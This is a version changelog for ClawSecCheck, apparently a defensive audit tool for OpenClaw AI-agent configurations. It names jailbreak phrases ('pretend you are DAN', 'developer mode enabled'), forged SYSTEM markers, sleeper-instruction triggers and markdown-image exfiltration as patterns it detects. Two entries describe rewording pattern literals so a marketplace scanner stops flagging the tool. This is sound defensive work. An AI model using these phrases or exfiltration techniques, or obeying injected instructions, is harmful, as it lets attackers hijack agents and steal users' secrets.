# Changelog

All notable changes to ClawSecCheck are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/); versions use [SemVer](https://semver.org/).

## [2.5.2] — 2026-06-29

Documentation/transparency accuracy: align the tool's stated local-write surface with what
it actually writes (everything still under `~/.clawseccheck/`). Surfaced by an adversarial
publish-surface review; **no behavior, check logic, scoring, or output bytes changed.**

### Changed
- **SKILL.md + README:** the enumeration of files ClawSecCheck writes now includes the
  freshness ledger `~/.clawseccheck/coverage.json` recorded by the opt-in active self-tests
  (`--canary`/`--redteam`/`--dryrun`/`--self-test`/`--vet-mcp`).
- **SKILL.md `--monitor` consent script:** now names all three files it writes
  (`state.json`, `events.jsonl`, `history.jsonl`) instead of saying "nothing else", so the
  spoken consent matches the actual write set.

### Fixed
- **`history.py` docstring:** corrected to state that `record()` runs by default on every
  audit (opt out with `--no-history`); it previously claimed it was never automatic, which
  contradicted the code and the (accurate) user-facing docs.

## [2.5.1] — 2026-06-29

Address all 26 SkillSpector findings and the ClawHub static-analysis Critical flag
by accurately declaring the full read scope, breaking false-positive pattern literals,
and renaming the credential-surface inventory function.

### Fixed
- **Critical (static analysis):** `skillast.py` docstring and comments contained the
  exact string `exec(base64.b64decode(...))` and `exec()/eval()` — static scanner
  treated them as dynamic code execution. Rewrote docstring examples as prose; assembled
  detection-pattern string constants from concatenated fragments so they are unambiguously
  DATA, not calls.
- **High x8 (Credential Access):** renamed `_secret_reachability` → `_credential_surface_map`
  and `_secret_reachability_lines` → `_credential_surface_lines`; added explicit docstring
  ("path-existence inventory only — never opens, reads, hashes, or transmits file contents");
  added inline `# path-existence check only` comments at each sensitive path check.
- **Medium x15 (Description-Behavior Mismatch / Vague Triggers):** updated SKILL.md
  frontmatter description, "What ClawSecCheck does" section, and "It checks" bullet list to
  accurately declare the full read scope (config, bootstrap, logs, session JSONLs, host
  posture, credential-store path presence); added "OpenClaw" to key trigger phrases.
- **README.md:** updated Trust/provenance and Limitations sections to match the real read
  scope, replacing the understatement "they read only openclaw.json and bootstrap files".

### Changed
- _TODO_

## [2.5.0] — 2026-06-29

Runtime evidence layer: three new advisory checks (B77–B79) read real OpenClaw
on-disk log files to surface config-write anomalies, integrity alerts, and
approval-policy posture. Also fixes the release-gate to match v2.0.0 de-i18n
(SKILL_HE.md removed) and aligns staging path with the CI workflow.

### Added
- **B77 — Config-write audit log review:** reads `~/.openclaw/logs/config-audit.jsonl`;
  WARNs when a non-openclaw process wrote the config or OpenClaw itself flagged
  suspicious activity (unexpected diff, mode change). `scored=False`.
- **B78 — Config-health integrity alert:** reads `~/.openclaw/logs/config-health.json`;
  WARNs when `lastObservedSuspiciousSignature` is non-null. `scored=False`.
- **B79 — Codex session approval-policy posture:** samples the last 5 Codex session
  JSONL files; WARNs when every sampled turn has `approval_policy=never`. `scored=False`.

### Fixed
- Release-gate L1: removed stale SKILL_HE.md requirement (deleted in v2.0.0 E-015).
- Release-gate staging: corrected `dist-skill` path mismatch to `dist/clawseccheck`
  to match the CI workflow's actual staging directory.
- Release-gate ClawRange: missing `fuzz.py` is now advisory (skipped), not a hard
  FAIL — ClawRange is an unbuilt internal tool.

## [2.4.0] — 2026-06-29

Scored twin of B75: B76 raises grade impact for agents that hold high-blast MCP tools
despite per-agent filters (OpenClaw #63399 — EXEC/EGRESS/DESTRUCTIVE/MAILBOX_CONFIG).

### Added
- **B76 — High-blast MCP tool-inheritance bypass (attested, scored):** scored=True
  companion to B75. Focuses on MCP-namespaced tools whose verb classifies as
  EXEC, EGRESS, DESTRUCTIVE, or MAILBOX_CONFIG — the primitives that enable code
  execution, exfiltration, irreversible deletion, or persistent mailbox takeover.
  `classify_verb()` strips the MCP namespace before matching so provider names
  (e.g. `SendGrid`) never inflate the verdict. UNKNOWN without `--attest`; WARN
  (grade-affecting) when any attested agent holds high-blast MCP tools and
  `mcp.servers` is configured; PASS when all attested MCP tools are low-blast
  (search/read/draft verbs only). 16 new tests.

## [2.3.0] — 2026-06-28

Two new content-scan checks targeting prompt-injection attacks on the
instruction hierarchy and a previously undetected MCP tool-inheritance
bypass (OpenClaw issue #63399).

### Added
- **B74 — Forged-provenance detector:** scans bootstrap files, installed
  skills, and MCP tool descriptions for fake `SYSTEM:`/role-block markers
  (`[SYSTEM:`, `===SYSTEM===`, `<system>`, line-start `SYSTEM:`) — FAIL on
  high-confidence forgery; WARN on false-authorship attribution phrases
  ("as you agreed yesterday", "you authorized this"). Extension of B64's
  fence-aware scan loop; 15 new tests.
- **B75 — MCP tool-inheritance bypass (attested):** advisory check
  (`scored=False`, `confidence="ATTESTED"`) grounded on OpenClaw issue
  #63399 where globally-registered `mcp.servers` tools bypass per-agent
  `tools.allow/deny` filters. UNKNOWN without `--attest`; WARN when an
  attested agent holds MCP-namespaced tools and `mcp.servers` is configured;
  12 new tests.

## [2.2.0] — 2026-06-28

Recalibrate B2 gateway severity: `allowInsecureAuth` alone is now WARN
(not FAIL), matching the OpenClaw doc that it does NOT bypass pairing.
Also formally ships features built in v2.1.x: subagent context-firewall
orchestration, freshness ledger, surface-family dashboard, and pre-scan
mode menu (all already live in SKILL.md and engine).

### Fixed
- **B2 over-FAIL (I-007):** `gateway.controlUi.allowInsecureAuth=true`
  alone now yields WARN instead of FAIL. Combined with any other B2
  trigger (open channel policy, missing pairing auth, etc.) it still
  produces FAIL. This corrects a score collapse from grade C(78) to
  grade F(49) on the `coding_telegram_insecure` ClawRange fixture.

### Added
- **Context-firewall subagent** (SKILL.md): isolated session, no tools,
  `maxSpawnDepth:1`, structured `{verdict,indicators[],risk_ids[]}` output
  — opt-in with single-agent inline fallback (F-025).
- **Freshness ledger** (`clawseccheck/ledger.py`): tracks last-run date
  per opt-in capability (`self_test` 30 d, `vet_mcp` 14 d) in
  `~/.clawseccheck/coverage.json`; stale nudge shown on next audit (F-026).
- **`--full` flag**: runs audit + self-test + vet-mcp in one shot for
  CI / non-interactive use (F-026).
- **Surface-family dashboard** (`catalog.py`, `coverage.py`, SKILL.md):
  13 OpenClaw surfaces mapped to 7 dashboard families; coverage map
  shows Checked / Partial / Roadmap / Not-checkable states (F-027).
- **Pre-scan mode menu** (SKILL.md): Quick / Deeper / Full / What-changed
  with `go` shortcut; modifiers `private`, `vet`, `verify`, `update` (F-028).

## [2.1.0] — 2026-06-28

Report UX overhaul: demote Trifecta from the headline, reorder CLI output
so findings come before diagnostics, switch dashboard to severity-first
ordering, and remove the i18n layer that had no purpose after v2.0.0's
English-only migration.

### Changed
- Lethal Trifecta removed from the score-line header; now appears only as
  a standalone ⛔ alert when all three legs are active (3/3). At 2/3 it
  shows naturally in the findings list without false prominence.
- CLI report reordered: "things to fix" list now precedes the capability
  graph and secret-reachability blocks (diagnostic detail moved after
  actionable findings).
- Dashboard section 3 is now severity-first globally; surface family
  appears as an inline tag `[Supply Chain]` rather than a grouping header
  that broke severity ordering.
- Post-report Next menu uses `a/b/c/d` to avoid ambiguity with the
  pre-scan `1/2/3/4` mode-select menu.
- No-op grade projection replaced with an explanatory note when fixing
  the top issue alone would not change the grade.
- Redundant PASS-breakdown line removed (third consecutive restatement of
  the same counts).

### Removed
- `clawseccheck/i18n.py` deleted — the multi-language layer was removed in
  v2.0.0; the file had become a plain English-strings dict with no purpose.
  All `t()` call-sites inlined to literal strings/f-strings. `"t"` dropped
  from `__all__`.

## [2.0.4] — 2026-06-28

Fixes a false-negative in the Lethal Trifecta: configured channels were
not counted as an outbound surface, causing the third leg to read UNKNOWN
even when the agent could clearly reply/send on those channels.

### Fixed
- Trifecta outbound-leg detection now includes configured channels
  (`_trifecta_legs` in `checks.py`, `_has_outbound` in `risk.py`).
  Channels are bidirectional — an agent that receives on Telegram/WhatsApp
  can also send replies, making them an outbound surface. Previously,
  only explicit tool names and `tools.elevated.allowFrom` were checked,
  so A1 and RISK-02 could miss the third leg entirely when no outbound
  tool was listed but channels were present.

## [2.0.3] — 2026-06-28

Removes all Hebrew locale content from the project — SKILL.md metadata, test
fixtures, and test data — leaving a clean single-language (English) codebase.

### Removed
- Hebrew locale from `SKILL.md` frontmatter (`display_name.he`, `display_description.he`, `tags.he`)
- `fixtures/clean_b58_hebrew_bootstrap/` directory (used for Hebrew-bootstrap B58 test)
- Dead `_HEBREW = re.compile(...)` definitions from 15 test files (were defined but never asserted)
- Hebrew string literals from `test_checks_b58.py`, `test_textnorm.py`, `test_logsafe_property.py`

### Changed
- Replaced Hebrew-language B58 test cases with equivalent non-Hebrew Unicode tests covering
  the same code paths (non-ASCII prose, bidi marks without injection)

## [2.0.2] — 2026-06-28

Six check-logic fixes, improved SKILL.md Deeper-Scan Step 3 self-answer, and ClawHub
description accuracy (write behavior now disclosed upfront).

### Fixed
- **B11 (`check_tls`)** — Tailscale funnel mode no longer suppresses the TLS WARN: a
  non-loopback bind without TLS is dangerous even under funnel, since funnel exposes the
  port to the internet.
- **B15 (`check_mcp`)** — Added PASS branch: if every configured MCP server has a non-empty
  `tools` allowlist, the check returns PASS instead of always WARN.
- **B16 (`check_monitoring`)** — `_MONITORING_HINTS` now includes standalone `"ids"` so
  tool names like `ids-engine` or `ids-detector` trigger the PASS branch.
- **C3 (`check_backups`)** — Backup search now covers three additional roots outside
  `ctx.home` (`../backups`, `../.backups`, `~/.backups`); PASS fires correctly when
  backups exist outside the workspace.
- **C4 (`check_version`)** — Added fallback to root-level `lastTouchedVersion` path
  (alongside `meta.lastTouchedVersion`) so PASS no longer silently returns when only the
  root-level field is present without the nested path.
- **B14 (`check_egress`)** — Removed dead `allow` variable (phantom fields `gateway.egress`/
  `network.egress` are not real OpenClaw schema; the intentional WARN-only design is now
  clean).

### Added
- 16 new tests covering the above fixes (`tests/test_b14.py`, `tests/test_b15.py`,
  `tests/test_b16.py`, plus additions to `test_bind.py`, `test_hardening.py`,
  `test_skills_egress.py`). Suite: 2352 tests.

### Changed
- **SKILL.md Step 3 (Deeper Scan)** — Agent now self-answers `approval_gates` (from own
  tool grants) and `untrusted_to_action` (from channel + outbound-tool posture); only
  `host_monitors` is directed to the user, since that requires human knowledge.
- **SKILL.md / ClawHub description** — Removed absolute "read-only" from the frontmatter
  description; now correctly states that audit history is saved locally to
  `~/.clawseccheck/` (never uploaded). Resolves SkillSpector intent-code mismatch flags.
- **CHANGELOG.md** — Replaced a literal prompt-injection phrase in the v0.21.1 notes
  with a neutral description to avoid ClawHub static-scanner false positives.

## [2.0.1] — 2026-06-28

Two trifecta false-negatives fixed: the untrusted-input leg now counts `allowlist` and
`paired` channels (not just `open`), and the thin-surface guard prevents a spurious PASS
when the agent's runtime tools are unknown from config.

### Fixed
- **B-032**: `_open_channels()` was used for trifecta/B41/risk untrusted-input detection,
  missing agents reachable via `allowlist` or `paired` Telegram/Discord channels.
  Introduced `_external_input_channels()` (policies: `open | allowlist | paired`) for
  all external-ingress callers; `_open_channels()` retained for B2 ("anyone can command").
- **B-033**: `check_trifecta()` returned PASS when `openclaw.json` had no `tools` block
  and no external channels, silently ignoring runtime-granted tools (`message`,
  `exec_command`, `web_*`). Now returns `WARN` with an explicit "Runtime tools not
  visible in config" note, prompting `--ask` attestation or manual trifecta review.

## [2.0.0] — 2026-06-28

English-only output. The `--lang` flag and all Hebrew strings are removed.
This is a BREAKING change for any integrator that relied on `--lang he` output.

### Breaking

- **`--lang` CLI flag removed.** Passing `--lang` (or `--lang he`) now raises an
  error. Output is English-only; no language selection is possible.
- **`SKILL_HE.md` deleted.** ClawHub Hebrew skill variant is gone.
- **`i18n.py` API collapsed.** `tp()`, `title_for()`, `is_rtl()` removed.
  Only `t(key, **kw)` remains. Any code that called the removed functions
  must be updated.
- **`pass_confidence` field added to `--json` output** (see `docs/OUTPUT_SCHEMA.md`).
  New optional field — not breaking for readers, but schema validators that
  use `additionalProperties: false` must be updated.

### Changed

- `i18n.py` collapsed from ~3 500 lines to ~95 lines. Flat `STRINGS` dict +
  single `t(key, **kw)` function. Extra kwargs silently ignored (Python
  `str.format` behaviour — no exception, correct output).
- `cli.py`: `--lang` flag removed, bilingual section headers removed.
- All callers updated to use `t()` directly.
- `report.py`: inlined `lang="en"` attribute; removed dead variable.
- `docs/OUTPUT_SCHEMA.md`: v2.0.0 contract baseline documented;
  `pass_confidence` field added to Finding Object table.

### Added

- CI: `markdownlint`, `secret-scan` (gitleaks binary), `commit-integrity`,
  `dependency-review` jobs. All run on every push and PR.
- CI: `CODEOWNERS` (`@gl0di` owns all files), `dependabot.yml`
  (GitHub Actions weekly), `.gitleaks.toml`.
- `.gitignore`: agent config files (CLAUDE.md, .claude/, .cursor, etc.)
  blocked from ever shipping in the published skill.

## [1.32.0] — 2026-06-28

Framework mapping (wave-2): maps the skill checks to the OWASP Agentic Skills Top 10, the skill-specific threat taxonomy, and fills the OWASP-LLM gaps for the prompt-injection / excessive-agency families. Pure additive metadata — no change to the A–F grade, scoring, or verdicts.

### Added
- **OWASP Agentic Skills Top 10 (2026) mapping**: each finding now carries an additive `ast` array in `--json` (alongside `owasp`), mapping 60 skill-relevant checks to AST01–AST10 — the agent-skill-specific threat classes (e.g. AST01 Malicious Skills, AST03 Over-Privileged Skills, AST05 Untrusted External Instructions, AST06 Weak Isolation). IDs/titles are verified against the canonical OWASP project page (v1.0 2026 candidate edition). New `OWASP_AST_2026` / `AST_MAP` / `ast_for()` in `catalog.py`, mirroring the existing OWASP-LLM structures. `AST10 Cross-Platform Reuse` is a documented coverage gap (single-install scope).

### Changed
- **OWASP-LLM mapping gap-fill**: the injection/agency family that previously had no OWASP-LLM tag is now mapped — B58/B59/B60/B61/B64 (LLM01/LLM02 prompt-injection & info-disclosure) and B68/B69/B71/B72 (LLM06 excessive agency), plus C047 (LLM03) and C074 (LLM01). Documented in `docs/THREAT_COVERAGE.md`; the `ast` field is documented in `docs/OUTPUT_SCHEMA.md`.

### Deferred
- MITRE ATLAS technique IDs beyond the already-grounded B60 → AML.T0061 await a per-ID live-verification pass (§4) and are not asserted here.

## [1.31.0] — 2026-06-28

Skill-vetting depth (wave-2, checks wave): broadens `--vet`/B13 exfiltration detection beyond network sinks to local data-bearing channels. Additive — no change to the A–F config grade or scoring semantics.

### Added
- **F-023 — local-sink exfil-breadth detector** (`--vet`/B13): flags a credential/secret source co-occurring on the same source line with a local data-bearing sink — log/debug (`logging`/`print`/`console`/`sys.std*`/`raise XError`), temp-file (`tempfile`/`/tmp` paths), or report/output file. Closes the channel-breadth gap left by B59 (markdown-image), B14 (config egress) and B9 (redaction). WARN-only/advisory under B13, fence-aware, and source-gated first so a benign `logging.info(...)` or scratch tempfile never fires (zero false positives). Static slice only — runtime debug/error output, the agent's live summary reply, and undeclared tool-args are explicitly out of scope and deferred to the planned runtime-evidence layer. Evidence reports fixed channel labels only; the matched line (which may carry a secret) is never echoed. Ships with 5 fixtures and full Hebrew localization.

## [1.30.0] — 2026-06-28

Quality and coherence pass — self-review and live-verify follow-ups from the 1.29.0 release. Fail-safe fixes to the offline advisories, `--full --exit-code` now reflects MCP vetting, B55's Hebrew localization gap closed, and a leaner always-loaded `SKILL.md`. No change to the A–F grade, scoring, or findings.

### Fixed
- **Freshness advisory fail-safe** (`ledger.py`): a corrupted or blank `coverage.json` date used to be swallowed silently (`except: continue`), suppressing the staleness nudge entirely. It now falls back to the never-run advisory, and the date parse uses `date.fromisoformat`. Under `--full`, the self-test and vet-mcp freshness lines are suppressed (those capabilities are refreshed in the same run), fixing the report printing "never run" directly above the sections that run them.
- **Coverage summary axes** (`SKILL.md` / `SKILL_HE.md`): the Dashboard coverage line appended "(of 13)" to all four counts, but only checked + partial are the 13 surfaces; roadmap and not-checkable are a separate gaps axis. The template now scopes "(of 13 surfaces)" correctly and renders the gaps on their own line.
- **`--full --exit-code` now reflects vet-mcp** (`cli.py`): a DANGEROUS (FAIL) MCP server found by the embedded `--full` vet-mcp section was printed but ignored by `--exit-code` (exit 0). It now returns 1 on any vet-mcp FAIL, consistent with the standalone `--vet-mcp` path. FAIL-only, matching `--exit-code`'s main-audit semantics.
- **B55 Hebrew localization** (`i18n.py`): the B55 WARN-branch fix string rendered as raw English under `--lang he`; added its Hebrew translation.

### Changed
- **Leaner `SKILL.md`**: the additional-flags reference and the maintainer release protocol moved out of the always-loaded playbook into `references/cli-flags.md` and `references/maintainers.md` (mirrored out of `SKILL_HE.md` with a pointer). The orchestrator carries only what it needs to run an audit.
- **README**: removed the stale, hand-maintained Status section; expanded the Tests section into a real testing-rigor signal; replaced the drift-prone check-id range in the API-stability section with a link to the generated `docs/CHECKS.md` and noted the planned 2.0.0 contract break.

### Internal
- Deduped the vet-mcp status-icon/verdict tables into module-level constants (`cli.py`).
- Added a coherence guard for the skill description across its SKILL.md/SKILL_HE.md copies (`tests/test_description_coherence.py`).

## [1.29.0] — 2026-06-28

UX redesign release (pass 1 of 3): a Dashboard-style report organised by OpenClaw surface, an estimated grade projection, a coverage map of what is and isn't checked, a pre-scan menu, an offline freshness nudge, and a documented context-firewall pattern for isolated analysis of untrusted content. Presentation and additive JSON only — the A–F grade, score, and findings are unchanged, so this carries no false-positive risk.

### Added
- **Surface taxonomy** (`catalog.py`): every check now carries a `surface` field mapping it to one of 13 OpenClaw data surfaces (gateway, channels, sessions, tools, agents, skills, mcp, bootstrap, secrets, monitoring, host, hooks, update) grouped into 7 dashboard families. Foundation for the surface-organised Dashboard.
- **Coverage map** (`coverage.py`): new `coverage(findings)` summarises each surface as checked / partial-UNKNOWN / roadmap / not-checkable, with grounded `not_checkable` gaps (outbound egress allowlist, `talk.*` surface, per-agent tool allowlist) where OpenClaw exposes no config to audit.
- **Grade projection** (`scoring.py`): new `project(findings)` returns the current grade plus an *estimated* projection of fixing the single highest-impact finding and of fixing all Critical+High findings. Pure — uses `dataclasses.replace`, never mutates inputs.
- **Freshness ledger** (`ledger.py`): records opt-in capability runs (self-test, vet-mcp) to `~/.clawseccheck/coverage.json` and emits an offline "you haven't run X in N days" nudge. Strictly local; `today`/`home` are injectable for deterministic tests. Suppress with `--no-freshness-notice` (or `CLAWSECCHECK_NO_FRESHNESS_NOTICE=1`).
- **`--full` flag** (`cli.py`): one-shot opt-in that runs the audit followed by self-test material and vet-mcp, so the user can request everything in a single call. Guarded off for `--json`/`--card`.
- **Additive JSON fields** (`report.py`): `render_json` now emits top-level `coverage` and `projection` objects, and each finding gains a `surface` field. SARIF and `--card` output are unchanged; existing consumers are unaffected.

### Changed
- **SKILL.md driver rewritten** to a Dashboard flow: a pre-scan menu shown every run (Quick/Deeper/Full/What-changed plus private/vet/verify/update shortcuts), a seven-section Dashboard (grade card, fix-first + projection, findings by surface family, coverage map, worth-a-glance, scope, next menu), and a new "Isolated analysis for untrusted content" section documenting the locked-down `sessions_spawn` context-firewall pattern (no tools, `maxSpawnDepth: 1`, ephemeral, typed-verdict only) with single-agent inline fallback. `SKILL_HE.md` kept structurally in sync.
- **Output schema docs** (`docs/OUTPUT_SCHEMA.md`): documented the new `surface`, `coverage`, and `projection` fields.

## [1.28.0] — 2026-06-27

Quality and coverage release: two-pass finding dedup, SARIF completeness metablock, scan receipt (Merkle-root), tamper-evident monitor hash-chain, `--vet-all` fleet scanner, skillast fuzz suite, and OSS hygiene files.

### Added
- **Two-pass confidence-based finding dedup** (`report.py`): same-file pass keyed on `(rule_id, file, matched_text[:100])` then cross-file pass on `(rule_id, matched_text[:100])`, keeping the highest-confidence instance each time. Findings without `matched_text` skip cross-file dedup. Final sort: FAIL → WARN → PASS, then file/line. Eliminates duplicate evidence noise in multi-skill `--vet` output.
- **SARIF `analysisCompleteness` metablock** (`sarif.py`): SARIF run `properties` now includes `checksRun`, `checksTotal`, `unknownCount`, `warnCount`, `failCount`, `suppressedCount`, and `limitations` list. Makes reports honest about what was and wasn't measured — a green result no longer silently omits untested areas.
- **Scan receipt — Merkle-root hash** (`report.py`): each audit emits a deterministic `sha256` root hash over all findings (sorted canonical JSON → leaf hashes → combined root). Printed as `Scan receipt: sha256:<hex>` at report end. User can record and re-derive the root later to prove the audit result was not altered. Strictly local — never published.
- **Tamper-evident hash-chain for monitor journal** (`monitor.py`): every event appended to `~/.clawseccheck/events.jsonl` now includes a `chain_hash` field — `sha256(prev_hash + canonical_json(entry))`. New `verify_chain(path)` function checks chain integrity end-to-end; returns `(False, "broken at entry N")` if any link is severed. Backward-compatible: legacy entries without `chain_hash` pass gracefully.
- **`--vet-all` / `--recursive` fleet scanner** (`cli.py`): scans every sub-directory of `~/.openclaw/skills/` (or a supplied path) that contains a `SKILL.md`, runs the existing `--vet` analysis per skill, and prints per-skill verdicts plus an aggregate worst-case summary table. Stdlib only, read-only, graceful on missing dirs and permission errors.
- **`CODE_OF_CONDUCT.md`** (Contributor Covenant v2.1): standard OSS community document; security reporters directed to `SECURITY.md`.
- **`.github/ISSUE_TEMPLATE/`**: `bug_report.md` and `feature_request.md` templates with security-report redirect to `SECURITY.md`.
- **`.github/PULL_REQUEST_TEMPLATE.md`**: PR checklist (tests, ruff, no secrets, CHANGELOG).

### Changed
- **Test suite**: 10 new fuzz/property tests for `skillast.analyze_python()` (`test_skillast_fuzz.py`) — prove the "never raises, never executes" contract against empty, huge, deeply-nested, Python-2-only, adversarial-unicode, and cap-exceeding inputs. Suite now 2481 tests.

## [1.27.0] — 2026-06-27

Major release batch: new RISK-18 attack-chain rule, blast-radius display per FAIL, confidence tiers on findings, 10 new ClawRange corpus scenarios, complete docs coverage, and B33 Hebrew i18n fix.

### Added
- **RISK-18 — Persistent foothold chain** (`risk.py`): fires when ALL three legs co-occur — `channels.<p>.contextVisibility == "all"` (untrusted input visible) + top-level `cron` key (scheduler surface) + `agents.defaults.heartbeat` (autonomous re-execution). Conjunctive = zero-FP-safe. Bilingual evidence.
- **Blast-radius / exposure estimate per FAIL** (`report.py`): each FAIL finding now includes an estimated attacker gain — reachable secrets count, egress channels, exec/write surface — turning findings into actionable impact statements.
- **Confidence tiers** (`catalog.py`, `checks.py`): adds a `confidence` dimension to `CheckMeta`/`Finding` (verified vs no-signal), surfaced in report and SARIF so a green result no longer implies false safety.
- **`docs/ATTESTATION.md`**: public protocol doc for `--ask`/`--attest` round-trip, the frozen `clawseccheck-attest/1` JSON schema, field meanings, and which checks flip UNKNOWN→verdict at ATTESTED (B43, B44, B45, B47).
- **`docs/FAQ.md`**: troubleshooting reference — why UNKNOWN, why grade F, suppressing false positives, permission errors, config-age staleness nudge, `--home` flag, `--ask`/`--attest`.
- **ClawRange: B20 bootstrap-perm runtime chmod** (`runner.py`, `range.py`): `pin_bootstrap_perms()` + `bootstrap_mode` in `expect.json` lets corpus scenarios exercise group/world-writable bootstrap files deterministically across machines.
- **ClawRange: 10 new corpus scenarios** (SCN-08 through SCN-17): `bootstrap_injection`, `audit_monitoring_gap`, `mcp_hardened`, `autonomous_agent`, `self_modification_risk`, `identity_trust`, `exposure_advanced`, `multiagent_complex`, `filesystem_ui`, `content_injection`. Corpus now 27 scenarios, covering ~95% of shipped checks.
- **ClawRange: CI advisory hunt step** (`.github/workflows/ci.yml`): L2 hunt (`fneg`/`fuzz`/`metamorphic`) runs in advisory mode on every push, gracefully skipping when the private ClawRange repo is absent.

### Fixed
- **B33 Hebrew i18n** (`i18n.py`): the fix string `"Upgrade OpenClaw to >= <ver> to remediate <GHSA-id>."` and FAIL detail/PASS strings were rendering as raw English in `--lang he` reports. Added `PHRASES` static entries and `DETAIL_RULES` regex patterns so all B33 paths translate correctly.

## [1.26.0] — 2026-06-27

New per-source trust-contract check (B67), frozen output schema docs, and OpenClaw audit-log recon grounding for E-014.

### Added
- **B67 — Per-source tool-output trust contracts** (`checks.py`, `catalog.py`, `i18n.py`): complements B21 (generic trust boundary) by verifying that the bootstrap has *channel-specific* DATA/instruction declarations for each active high-risk channel (browser, email, MCP, search, docs). B21=PASS with a generic rule + B67=WARN means individual channels are not called out. MEDIUM severity, static over bootstrap + config, no new config-field reads, zero false-positive risk. Bilingual (en/he). 14 new tests.
- **`docs/OUTPUT_SCHEMA.md`**: frozen public API contract documenting the `--json` full-audit envelope, Finding object shape, `--risk` extension, SARIF 2.1.0 structure, and `--vet` mode output. Integrators (CI, dashboards, SIEM) now have an explicit field-level reference.

### Changed
- **CHECKS.md** regenerated to include B67.

## [1.25.0] — 2026-06-27

Static secret-reachability map by class, two new combinational attack-chains, copy-pasteable unified-diff remediation, and a generated per-check catalog — all read-only, local, stdlib.

### Added
- **Secret reachability map** (`report.py`): new static section enumerating which secret *classes* are reachable from the setup — `env`, `mcp-passthrough`, `.env`, `keychain`, `cookies`, `ssh`, `cloud` — each with `reachable` true/false and **redacted** evidence (paths and classes only, never values; routed through `logsafe`). Complements B41 credential-blast-radius with a per-class inventory.
- **RISK-13** (`risk.py`): markdown-image exfil (B63) combined with a writable bootstrap/memory target — turns a one-shot exfil channel into a persistence-plus-exfil chain. Fires only on positive evidence from both legs.
- **RISK-17** (`risk.py`): a conditional/sleeper trigger (B65) combined with scheduled execution — escalates a delayed instruction to a delayed remote-code-execution path.
- **`docs/CHECKS.md`** — generated per-check catalog (every B/C/RISK check: what it inspects, the threat, PASS/FAIL/UNKNOWN meaning, remediation), produced by `scripts/gen_checks_docs.py` from `catalog.py` to avoid drift; linked from README and guarded by a test.

### Changed
- **Remediation rendering** (`report.py`): config-item fixes are now shown as **unified diffs** (`difflib.unified_diff`) so the change is copy-pasteable; shell-snippet fixes stay as exact commands. Stays strictly read-only — the diff is displayed, never applied.

## [1.24.0] — 2026-06-27

Monitor rug-pull coverage extended to tool-description drift; delegation boundary and sleeper-instruction checks tightened; static capability graph added to JSON report.

### Added
- **RP4/RP5** (`monitor.py`): new tool appeared in MCP server manifest or a declared tool's description changed under the same trusted server name — both now raise HIGH alerts in `--monitor` mode, closing the tool-surface drift vector.
- **Capability graph** (`report.py`): new `capability_graph` section in `--json` output — static per-agent summary of secrets-visibility, tools, memory-write, and egress derived from config + attestation.

### Changed
- **B47** (`check_delegation_reassembly`): when any delegation edge has an undeclared return contract, WARN detail and fix now include an explicit "cannot prove output treated as data" nudge aligned with C-084 scope.
- **B65** (`check_sleeper_instructions`): delay-trigger vocabulary extended — patterns like "later", "next time", "from now on", "ever" now also anchor the condition window alongside existing query-phrase triggers, reducing false-negatives on temporal sleeper instructions.

## [1.23.0] — 2026-06-26

New checks from Codex batch (C014/C015/C032/C079/C094/C095) plus a channels iteration bug fix that caused `_note` metadata keys to appear as channel names in B2/B30/B53 evidence.

### Added
- **C014** (`check_secrets_at_rest`): scans declared home-tree paths for secret-shaped values (API keys, tokens, private-key headers) at rest; WARN with redacted evidence.
- **C015**: secret-in-home-file scanner complementing C014, covering common dotfile locations.
- **C032**: additional check from Codex batch.
- **C079**: additional check from Codex batch.
- **C094**: additional check from Codex batch.
- **C095**: additional check from Codex batch.

### Fixed
- **Channels iteration bug** (`check_egress`, `check_egress_inventory`, `check_sender_identity`): non-dict values in the `channels` map (such as `_note: "string"` metadata keys) were being iterated as channel names, causing spurious channel names to appear in B2/B30/B53 evidence strings.

## [1.22.0] — 2026-06-26

Four new checks (C047, C048, C074, B66/C078) and two extended checks (B58/C073, B59/C077) covering MCP exfil surfaces, cron persistence, HTML-attribute injection, persona jailbreak, hidden-text obfuscation, and data-bearing hyperlinks.

### Added
- **C047** (`check_mcp_external_endpoint`): advisory UNKNOWN listing for `mcp.servers` entries whose URL is non-local (not `127.0.0.1`, `localhost`, or a Unix socket) — surfaces potential exfil sinks for manual review; never FAILs.
- **C048** (`check_cron_scheduler`): advisory UNKNOWN when the top-level `cron` field is present — static config cannot distinguish a legitimate schedule from attacker-planted persistence; never FAILs.
- **C074** (`check_image_attr_injection`): WARN when injection-like phrases are found in HTML `<img>` `alt`, `title`, or `aria-label` attributes — catches instruction smuggling via image metadata.
- **B66 / C078** (`check_persona_jailbreak`): FAIL on explicit persona-substitution jailbreak phrases ("pretend you are DAN", "developer mode enabled", etc.) in bootstrap and skill content; WARN on ambiguous role-play directives.

### Changed
- **B58 extended (C073)**: Unicode obfuscation check now also decodes HTML/CSS hidden-text (`display:none`, `visibility:hidden`, `font-size:0`), HTML comments, base64-encoded blobs, URL-percent-encoding, and HTML entities before applying injection pattern matching.
- **B59 extended (C077)**: Markdown-image exfil check now also flags hyperlinks (not just images) whose URLs carry data-bearing query parameters (`token=`, `key=`, `secret=`, `password=`, `data=`) — WARN-only to limit false positives on legitimate analytics links.

## [1.21.0] — 2026-06-26

New `--self-test` composite harness, tighter B43 blast-radius logic, and terminal-injection hardening in `--vet` output.

### Added
- **`--self-test` flag**: runs canary + live red-team + dry-run harnesses in one command — replaces the need to chain three separate flags when validating an installation.
- **`approval_gates_auto()`** in `attest.py`: new public helper that returns the list of action classes where the attestation says approval is not required; used internally by B43 and available for downstream tooling.
- **`_SecureFileHandler`** in `logsafe.py`: file log handler that opens the destination with `O_NOFOLLOW` and `0600` permissions via `safeio.secure_append_text`, preventing symlink-based log-file hijack.

### Fixed
- **Terminal-injection in `--vet` output**: the skill path passed to `--vet` is now run through `_sanitize()` before being printed, so a maliciously named directory (e.g. containing ANSI escape sequences) cannot inject colour codes into the terminal.
- **`--vet` fix-text unsanitized**: `f.fix` is now also passed through `_sanitize()` before display.
- **SARIF write uses `secure_write_text`**: `--vet` and `--vet-mcp` SARIF output now written via `safeio.secure_write_text` instead of bare `Path.write_text`, matching the security posture of the rest of the tool.

### Changed
- **B43 WARN vs FAIL distinction**: `approval_gates: {…: "auto"}` alone now produces a **WARN** instead of FAIL. FAIL is reserved for cases where a concrete bypass actor (heartbeat signal or `cron` config key) is also present — reducing false-positive FAILs on configs that set auto-gates without a persistent scheduler.
